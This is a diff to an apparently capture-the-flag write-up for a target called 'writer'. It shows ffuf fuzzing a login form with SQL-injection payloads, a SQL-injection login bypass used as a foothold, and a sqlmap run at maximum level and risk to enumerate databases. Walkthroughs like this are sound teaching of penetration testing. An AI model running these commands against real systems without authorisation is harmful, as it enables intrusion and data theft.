@@ -136,4 +136,13 @@ Now let's s use the payload with ffuf to fuzz a post
 ffuf -X POST -request post.txt -w Generic-SQLi.txt:UNAME -w Generic-SQLi.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790 > ffuf.sqli.writer.txt
 ```
 
-Fuzzing reveals a littany of different sqlinjection you can use for logging in. We'll go with `*/*`
+Fuzzing reveals a littany of different sqlinjection you can use for logging in. We'll go with `*/*`. With that we've achieved our initial foothold. It's time for...
+
+## Escalation
+
+Enumerating the site a bit we find a `/stories` section which allows users to post text stories. This immediately jumps out as a potential 
+code injection vector. Meanwhile, let's also run sqlmap on the site to see if we can find any other attack vectors.  First save a post request from burpsuite (r.txt).  Now run:
+
+``` 
+sqlmap -r r.txt --dbs --batch --level 5 --risk 3 > sqlmap.dbs.writer.txt
+```
